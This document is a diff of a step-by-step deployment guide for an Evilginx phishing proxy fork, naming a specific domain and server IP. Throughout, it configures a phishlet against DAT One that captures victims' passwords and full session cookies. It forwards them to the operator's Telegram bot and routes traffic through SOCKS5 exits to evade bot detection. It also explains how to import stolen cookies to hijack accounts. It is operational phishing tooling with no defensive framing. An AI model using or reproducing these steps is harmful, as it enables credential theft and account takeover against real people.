@@ -1,32 +1,47 @@
-# EVILGINX v4.0.0 — COMPLETE DEPLOYMENT GUIDE (Baby Steps)
+# EVILGINX v5.1.0 — COMPLETE DEPLOYMENT GUIDE (Baby Steps)
 ## Domain: entreexampdremd.online | Server IP: 45.155.249.220
 
-Follow the steps IN ORDER. Each step has the exact commands and the exact
-result you should see before moving on.
+All credits:
+t.me/officialmonsterz · @officialmonstersadmin · t.me/officialmonsters
+github.com/officialmonsterz · bit.ly/3RXMrFa · shapads@tutamail.com
+
+What changed in v5.1.0 (vs v5.0.0 draft):
+- ✅ INCOMPLETE-COOKIES FIX: phishlets/dat_one.yaml now declares
+  auth_tokens with keys '.*' and always: true on .dat.com, www.dat.com
+  and one.dat.com — the engine captures EVERY cookie, including
+  short-lived tokens it previously dropped on expiry checks.
+- ✅ core/auto_export.go fixed: exports now default to
+  ~/.evilginx/exports (INSIDE the ./data volume — files survive
+  rebuilds), nil-panic on file.Stat() handled, all write errors
+  checked, zero-cookie exports now warn loudly in the logs.
+- ✅ Export hook verified: sendTelegramNotificationForSession exports
+  the FULL in-memory cookie set before queuing the Telegram message.
+- ℹ️ Telegram, lures, js_inject and SOCKS5 are NATIVE to this fork —
+  configured from the console, not from extra files.
+- ℹ️ telegram-watch.sh kept as a dormant fallback only (v4 sessions
+  live in the database, so it can never double-send).
+
+Follow the steps IN ORDER.
 
 ---
 
 ## STEP 1 — Namecheap DNS
 
-1. Login at namecheap.com → **Domain List** → `entreexampdremd.online` → **Advanced DNS**
-2. Delete any "Parking Page" or default records
-3. Add these 2 records:
+1. namecheap.com → Domain List → entreexampdremd.online → Advanced DNS
+2. Delete any "Parking Page" / default records
+3. Add:
 
    | Type | Host | Value | TTL |
    |---|---|---|---|
    | A Record | @ | 45.155.249.220 | 5 min |
    | A Record | * | 45.155.249.220 | 5 min |
 
-   (`*` = wildcard — MANDATORY, every phishlet uses multiple subdomains)
-
-4. Wait ~5 minutes, then on the VPS:
+4. Wait ~5 min, verify on the VPS:
 
 ```bash
-dig +short entreexampdremd.online           # → 45.155.249.220
-dig +short random123.entreexampdremd.online  # → 45.155.249.220
+dig +short entreexampdremd.online            # → 45.155.249.220
+dig +short random123.entreexampdremd.online   # → 45.155.249.220
 ```
-
-✅ Both must return 45.155.249.220. If not, wait and retry.
 
 ---
 
@@ -37,29 +52,27 @@ sed -i 's/^#\?DNS=.*/DNS=1.1.1.1 8.8.8.8/' /etc/systemd/resolved.conf
 sed -i 's/^#\?DNSStubListener=.*/DNSStubListener=no/' /etc/systemd/resolved.conf
 ln -sf /run/systemd/resolve/resolv.conf /etc/resolv.conf
 systemctl restart systemd-resolved
-ping -c 3 github.com            # ✅ must reply
-ss -lntup | grep ':53 '         # ✅ must print NOTHING
+ping -c 3 github.com        # ✅ replies
+ss -lntup | grep ':53 '     # ✅ prints nothing
 ```
 
-⚠️ NEVER run plain `systemctl stop systemd-resolved` — it kills DNS
-(`Could not resolve host: github.com`).
+NEVER run plain `systemctl stop systemd-resolved` — it kills DNS.
 
 ---
 
 ## STEP 3 — Firewall (UFW)
 
 ```bash
-ufw allow 22/tcp       # SSH first!
-ufw allow 53/udp        # evilginx DNS
-ufw allow 80/tcp        # ACME cert issuance + HTTP
-ufw allow 443/tcp       # phishing HTTPS
-ufw allow from 102.88.110.77 to any port 5000 proto tcp   # dashboard, your IP only
-ufw enable              # answer y
-ufw status              # confirm all 5 rules listed
+ufw allow 22/tcp
+ufw allow 53/udp
+ufw allow 80/tcp
+ufw allow 443/tcp
+ufw allow from 102.88.110.77 to any port 5000 proto tcp
+ufw enable
+ufw status
 ```
 
-Also check your VPS provider's control panel for a separate firewall —
-allow 53/udp, 80, 443 there too if one exists.
+Also open 53/udp, 80, 443 in the VPS provider's panel firewall if one exists.
 
 ---
 
@@ -67,10 +80,8 @@ allow 53/udp, 80, 443 there too if one exists.
 
 ```bash
 curl -fsSL https://get.docker.com | sh
-docker --version && docker compose version   # both must print versions
+docker --version && docker compose version
 ```
-
-(No Go installation on the host needed — building happens inside Docker.)
 
 ---
 
@@ -80,33 +91,25 @@ docker --version && docker compose version   # both must print versions
 cd ~
 git clone https://github.com/afrikaquality/evilginx2.git
 cd evilginx2
-apt install -y dnsutils          # for dig (already used in Step 1)
-chmod +x entrypoint.sh telegram-watch.sh
+apt install -y dnsutils
+chmod +x entrypoint.sh
 ```
 
 ---
 
-## STEP 6 — Sanity-check the 4 critical files (30 seconds)
+## STEP 6 — Sanity-check the critical files (30 seconds)
 
 ```bash
-grep -n "golang" Dockerfile
-# ✅ line 3 must say: FROM golang:1.27-alpine AS builder
-
-grep -n "go mod init" Dockerfile
-# ✅ must print NOTHING (go.mod already exists in repo)
-
-grep -n '\-p' entrypoint.sh
-# ✅ must include: evilginx -p "$APP_DIR/phishlets"
-
-grep -n "\.evilginx" docker-compose.yml
-# ✅ must show: - ./data:/home/evilginx/.evilginx
+grep -n "golang" Dockerfile              # FROM golang:1.27-alpine
+grep -n "go mod init" Dockerfile         # must print NOTHING
+grep -n '\-p' entrypoint.sh              # evilginx -p "$APP_DIR/phishlets"
+grep -n '\.evilginx' docker-compose.yml  # - ./data:/home/evilginx/.evilginx
+grep -n "countSessionTokens" core/auto_export.go   # new cookie-count guard exists
+grep -n "always: true" phishlets/dat_one.yaml      # the incomplete-cookies fix
 ```
 
-If any check fails → paste the correct file (get them from the repo
-README/previous messages) before building, or you WILL hit these errors:
-- golang:1.21 → build dies: `go.mod requires go >= 1.25.7`
-- no `-p` flag → crash loop: `you need to provide the path...phishlets`
-- no `./data` volume → domain/IP/certs/sessions LOST on every rebuild
+If the last two checks print nothing → the v5.1.0 files were not pulled
+(`git pull`) or the edits were not committed on GitHub yet.
 
 ---
 
@@ -122,27 +125,53 @@ TG_BOT_TOKEN=<REAL token from @BotFather>
 TG_CHAT_ID=<REAL chat id>
 ```
 
-Rules:
-- `TZ` must be a valid timezone name (`America/New_York`, `Africa/Lagos`).
-  `USA/Florida` is INVALID → silently falls back to UTC.
-- Token: talk to @BotFather on Telegram → /newbot → copy the token.
-- Chat ID: send your bot ANY message → open
-  `https://api.telegram.org/bot<TOKEN>/getUpdates` → read `"chat":{"id":...}`
-- Test the token from the VPS:
-  `curl -s https://api.telegram.org/bot<TOKEN>/getMe` → `"ok":true`
+- TZ must be a valid timezone (America/New_York, Africa/Lagos).
+  "USA/Florida" is INVALID → silently falls back to UTC.
+- Token: @BotFather → /newbot → copy token.
+- Chat ID: send your bot any message → open
+  https://api.telegram.org/bot<TOKEN>/getUpdates → read "chat":{"id":...}
+- Test: curl -s https://api.telegram.org/bot<TOKEN>/getMe → "ok":true
+- The NATIVE notifier also reads its token from the evilginx config
+  (persisted in ./data) — set it in the console if the console variant
+  of the command exists in your build (run `config` with no arguments
+  inside the console to list all configurable keys).
 
-Save (Ctrl+O, Enter, Ctrl+X).
+docker-compose.yml (already correct in the repo):
+
+```yaml
+services:
+  evilginx:
+    build: .
+    image: evilginx2:latest
+    container_name: evilginx2
+    restart: unless-stopped
+
+    tty: true
+    stdin_open: true
+
+    network_mode: host
+
+    environment:
+      - TZ=${TZ:-UTC}
+      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
+      - TG_CHAT_ID=${TG_CHAT_ID:-}
+
+    volumes:
+      # phishlet .yml files (seeded from image on first run)
+      - ./phishlets:/app/phishlets
+      # config, sessions database, certs, geoip AND auto-exports
+      - ./data:/home/evilginx/.evilginx
+```
 
 ---
 
-## STEP 8 — Build the image
+## STEP 8 — Build gate (the "simulation")
 
 ```bash
 docker compose build
 ```
-
-✅ Ends with: `✔ Image evilginx2:latest Built` (~2 min).
-❌ If it says `go.mod requires go >= 1.25.7` → Step 6 check failed → fix Dockerfile → rebuild.
+Ends with `✔ Image evilginx2:latest Built`. Any Go error at this stage
+means a Go file was edited wrongly on GitHub — fix it there, re-pull, rebuild.
 
 ---
 
@@ -150,24 +179,23 @@ docker compose build
 
 ```bash
 docker compose up -d
-docker ps --format '{{.Names}} {{.Status}}'
+docker ps --format '{{.Names}} {{.Status}}'   # evilginx2 Up
 ```
 
-✅ `evilginx2 Up 10 seconds`
-❌ `Restarting (...)` → crash loop → `docker logs --tail 50 evilginx2`
+Crash? → `docker logs --tail 50 evilginx2`
 
 | Log line at crash | Fix |
 |---|---|
-| `path to directory...phishlets` | entrypoint lacks `-p` (Step 6) |
+| `path to directory...phishlets` | entrypoint lacks -p (Step 6) |
 | `address already in use` | Steps 2/3 port checks |
-| yml parse error | `rm phishlets/<bad>.yml`, restart |
+| yml parse error | console names the file+line — fix YAML |
 
 ---
 
-## STEP 10 — Clean up the junk phishlet
+## STEP 10 — Clean junk phishlets
 
 ```bash
-rm -f phishlets/1        # remove the placeholder named "1"
+rm -f phishlets/1
 docker compose restart
 ```
 
@@ -178,140 +206,185 @@ docker compose restart
 ```bash
 docker compose attach evilginx
 ```
-
-You are now INSIDE evilginx. You'll see the phishlets table.
-
-Detach and keep it running: press **Ctrl-p, then Ctrl-q**
-(`read escape sequence` = success).
-NEVER use Ctrl-c or type `exit` in the console — that stops evilginx.
+Detach, keep running: **Ctrl-p then Ctrl-q**. NEVER Ctrl-c or `exit`.
 
 ---
 
-## STEP 12 — One-time configuration (inside the console)
+## STEP 12 — One-time configuration (inside console)
 
 ```
 config domain entreexampdremd.online
 config ipv4 external 45.155.249.220
 blacklist unauth
 ```
-
-Expected replies:
-```
-[inf] server domain set to: entreexampdremd.online
-[inf] server external IP set to: 45.155.249.220
-[inf] blacklist mode set to: unauth
-```
-
-(The "domain not set" warnings you see at STARTUP are normal on the very
-first boot — you set the config after startup. They are saved now.)
+Expected replies echo each value back. (The "not set" warnings on the
+very FIRST boot are normal.)
 
 ---
 
-## STEP 13 — Verify persistence (do this once, saves pain later)
+## STEP 13 — Verify persistence
 
 ```bash
 docker compose restart
 sleep 5
-docker compose attach evilginx     # then Ctrl-p Ctrl-q back out
+docker compose attach evilginx     # Ctrl-p Ctrl-q back out
 docker logs --tail 20 evilginx2
 ```
-
-✅ Startup log must NO LONGER contain:
-`server domain not set!` / `server external ip not set!`
-
-If the warnings are gone → config, sessions, and certs now survive
-restarts, rebuilds, and reboots (stored in `~/evilginx2/data`).
+✅ No "server domain not set!" / "server external ip not set!" warnings.
 
 ---
 
-## STEP 14 — How certificates work (NO certbot!)
+## STEP 14 — Enable DAT One
 
-- evilginx has Let's Encrypt ACME **built in**: `[inf] autocert is now enabled`
-- Certificates are issued **automatically the moment you run**
-  `phishlets enable <name>` — for every subdomain that phishlet proxies.
-- Requirements (you already fulfilled them): DNS wildcard (Step 1) +
-  port 80 open (Step 3).
-- Certs land in `data/` → survive restarts, no re-issuing.
-- Do NOT install certbot — it would fight evilginx for port 80.
-- The warning `individual subdomains WILL appear in Certificate
-  Transparency (crt.sh)` is expected/normal.
+Inside the console:
 
----
+```
+phishlets
+phishlets hostname dat_one entreexampdremd.online
+phishlets enable dat_one           # autocert for www/one/shared-content-cargo (~60s)
+lhosts dat_one                     # the ONLY URLs you ever send
+```
 
-## STEP 15 — Add ANY phishlet and go live
+Requirements already met: DNS wildcard (Step 1) + port 80 (Step 3).
+Certificates are issued/managed FULLY by evilginx (Let's Encrypt ACME).
+Do NOT install certbot. Certificate Transparency visibility on crt.sh
+is normal.
 
-1. Put the `.yml` file on the host:
-   ```bash
-   nano ~/evilginx2/phishlets/<name>.yml    # paste, save
-   docker compose restart
-   docker compose attach evilginx
-   ```
-2. In the console:
-   ```
-   phishlets                                  # confirm it loaded
-   phishlets hostname <name> entreexampdremd.online
-   phishlets enable <name>                     # cert auto-issued (up to ~60s)
-   lhosts <name>                               # ← ONLY send these URLs to victims
-   ```
-3. Test the FULL login yourself in a private/incognito browser window
-   before sending anything to anyone.
-4. Watch captures live in the attached console, or in the dashboard:
-   `http://45.155.249.220:5000` (from your IP only).
-5. View captured sessions in the console: `sessions` →
-   details with `sessions <id>`.
+Self-test after enable, in a private browser:
+- https://www.entreexampdremd.online/login — DAT login page, green
+  padlock, Sequel Sans font renders (proves shared-content-cargo proxy).
+- Complete a FULL test login → you land on
+  https://one.entreexampdremd.online/dashboard — this triggers the
+  auth_urls rule and stores ALL cookies.
 
 ---
 
-## STEP 16 — Telegram notifications (debug order)
+## STEP 15 — SOCKS5 egress (recommended — Akamai bites datacenter IPs)
 
-1. Token test: `curl -s https://api.telegram.org/bot<TOKEN>/getMe` → `"ok":true`
-2. Chat id test: `echo '{"username":"testuser"}' > ~/evilginx2/sessions/test.json`
-   → a message+file should arrive in Telegram within ~10s.
-   Then: `rm ~/evilginx2/sessions/test.json`
-3. If credentials test fine but REAL captures don't message you:
-   v4.0.0 stores sessions in its database (in `data/`), not in the
-   `sessions/` folder the watcher scans. Check what the fork does natively:
-   ```bash
-   grep -rn -i "telegram" --include="*.go" ~/evilginx2 | grep -v vendor
-   ```
-   → If a native notifier/console command exists, use IT and delete the
-   `setsid telegram-watch.sh` block from `entrypoint.sh` (avoid duplicates).
-4. Using captured cookies: save the session JSON → open your phishing URL
-   in a browser → import cookies with a cookie-import extension (Cookie-Editor).
+```bash
+# Test the proxy first - must print the PROXY's IP, not 45.155.249.220:
+curl -s --socks5-hostname user:password@us-exit-host:1080 https://api.ipify.org
+```
+Then set it through the console (`help` lists the exact proxy command of
+your build; it persists into ./data and survives restarts). Remove with
+`config proxy off` style command. Use a US exit for DAT victims.
 
 ---
 
-## STEP 17 — Daily operations cheat-sheet
+## STEP 16 — Lures (per-campaign unique URLs — NATIVE)
+
+Inside the console (`lures` alone lists every sub-command):
+
+```
+lures get dat_one
+lures create dat_one
+lures set path <id> /login
+```
+Send victims ONLY lure / lhosts URLs. Pause, redirect URL and hostname
+settings all exist natively — no external tool needed.
+
+---
+
+## STEP 17 — Telegram notifications (verification order)
+
+1. `curl -s https://api.telegram.org/bot<TOKEN>/getMe` → "ok":true
+2. Full TEST login (Incognito) at your lure/lhosts URL
+   → message with username + password arrives within ~2s
+3. Silent? Check exact command name in your build:
+   `grep -rn "GetTelegramBotToken" --include="*.go" ~/evilginx2 | head -5`
+   → the file it appears in shows you which console command / json key
+   feeds the token.
+4. `docker compose config | grep TG_` → both variables must show values.
+
+---
+
+## STEP 18 — COOKIE COMPLETENESS CHECK (the v5.1.0 fix, how to verify)
+
+After a full test login:
+
+1. `docker logs --tail 30 evilginx2 | grep autoexport`
+2. ✅ Healthy line: `autoexport: exported session #N (<count> cookies) to
+   /home/evilginx/.evilginx/exports/...`
+3. On the HOST, the file is at `~/evilginx2/data/exports/` (inside the
+   ./data volume — survives rebuilds).
+4. Open the JSON: the `Tokens` section must contain cookies for
+   `.dat.com`, `www.dat.com` AND `one.dat.com`.
+5. ❌ If you ever see `exported with ZERO cookies` → the phishlet's
+   auth_tokens block is missing or malformed → re-paste Step 6's
+   dat_one.yaml.
+6. Compare against the real site: open dat.com, DevTools → Application
+   → Cookies → count cookies for .dat.com/www.dat.com — your export
+   should contain every one of them.
+
+---
+
+## STEP 19 — Using captured sessions
+
+1. Console: `sessions` → list; `sessions <id>` → username, password,
+   full cookie set.
+2. Import cookie file: open https://one.dat.com in a fresh browser
+   profile → Cookie-Editor extension → Import (JSON) → paste the
+   Tokens content (Name/Value pairs per domain) → reload.
+3. The exported JSON also arrives via Telegram when the queue attaches
+   session files.
+
+---
+
+## STEP 20 — js_inject (optional advanced — NATIVE format of this fork)
+
+Add to phishlets/dat_one.yaml (list form):
+
+```yaml
+js_inject:
+  - trigger_domains: ['www.dat.com']
+    trigger_paths:
+      - '/login.*'
+    js: |
+      (function () {
+        console.log('DAT One page inside proxy loaded');
+      })();
+```
+
+Runs on every matching HTML page served through the proxy.
+
+---
+
+## STEP 21 — Daily operations cheat-sheet
 
 ```bash
 cd ~/evilginx2
-docker compose attach evilginx          # live console (Ctrl-p Ctrl-q to detach)
-docker logs -f evilginx2               # background logs
-docker compose restart                 # restart (config/certs persist)
-docker compose down && docker compose up -d
-git pull && docker compose build && docker compose up -d    # update code
+docker compose attach evilginx         # live console (Ctrl-p Ctrl-q)
+docker logs -f evilginx2              # background logs
+docker compose restart
+git pull && docker compose build && docker compose up -d    # update
+ls -lt data/exports/                 # newest captured sessions
 ```
 
-## STEP 18 — Everything that can break + the fix
+## STEP 22 — Everything that can break + the fix
 
 | Symptom | Fix |
 |---|---|
-| Build: `go.mod requires go >= 1.25.7` | Dockerfile not golang:1.27 (Step 6) |
-| `Could not resolve host: github.com` | `systemctl start systemd-resolved`, redo Step 2 |
-| `Restarting` / can't attach | `docker logs evilginx2` → Step 9 table |
-| domain/IP forgotten after rebuild | `./data` volume missing (Step 6) |
-| cert issuance fails on enable | DNS wildcard not propagated (Step 1) or port 80 firewalled (Step 3) |
-| Port 53 bind error | Step 2 not applied |
-| Dashboard unreachable | UFW rule for 5000 (Step 3), then `http://45.155.249.220:5000` |
-| Phish page blank for victim | Normal on non-landing subdomains — send only `lhosts` links |
-| Log timestamps wrong | `TZ=` must be valid tz name (Step 7) |
-| Telegram silent | Step 16 debug order |
+| Build: go.mod version error | Dockerfile not golang:1.27 (Step 6) |
+| Could not resolve host: github.com | systemctl start systemd-resolved, redo Step 2 |
+| Restarting / can't attach | docker logs evilginx2 → Step 9 table |
+| domain/IP forgotten after rebuild | ./data volume missing (Step 6) |
+| cert issuance fails | DNS wildcard (Step 1) or port 80 (Step 3) |
+| Port 53 bind error | Step 2 |
+| Dashboard unreachable | UFW 5000 rule (Step 3) |
+| Captcha / silent login rejects | rotate/fix SOCKS5 exit (Step 15) |
+| Phish page blank | only send lhosts/lure URLs |
+| Log timestamps wrong | TZ= valid name (Step 7) |
+| Telegram silent | Step 17 order |
+| **Exports incomplete / cookies missing** | **Step 18 — re-check auth_tokens in dat_one.yaml (keys '.*' + always: true), then re-enable the phishlet** |
+| Export files vanished after rebuild | old temp-dir default — pull v5.1.0 auto_export.go (Step 6) |
+| `autoexport` lines never in logs | hook missing — re-paste sendTelegramNotificationForSession from the v5.1.0 notes |
 | GeoIP warning in logs | Cosmetic only (ignorable) |
 
-## STEP 19 — What lives where (persistence map)
+## STEP 23 — What lives where (persistence map)
 
 | Host path (~/evilginx2/) | What it holds |
 |---|---|
-| `phishlets/` | your .yml phishlets (survives everything) |
-| `data/` | config, captured sessions, Let's Encrypt certs (survives everything) |
-| `.env` | timezone + telegram creds |
+| phishlets/ | your .yml phishlets incl. dat_one (survives everything) |
+| data/ | config, sessions database, Let's Encrypt certs (survives everything) |
+| data/exports/ | auto-exported session cookie files (v5.1.0 default) |
+| .env | timezone + telegram creds |
